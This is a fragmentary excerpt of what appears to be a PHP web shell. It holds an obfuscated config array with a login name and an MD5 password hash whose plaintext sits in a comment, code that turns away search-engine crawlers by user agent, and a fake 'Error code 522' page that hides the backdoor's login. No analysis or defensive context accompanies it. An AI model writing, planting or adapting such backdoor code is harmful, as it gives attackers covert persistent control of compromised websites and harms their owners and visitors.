...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'baby',
    'password' => '8a30ec6807f71bc69d096d8e4d501ade',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('<h1>Internal Server Error</h1>');exit;}}
...
echo "<html><head>
<title>Connection timed out Error code 522</title>
</head><body>
...
<p>Please contact the server administrator at 
 webmasterto inform them of the time this error occurred,
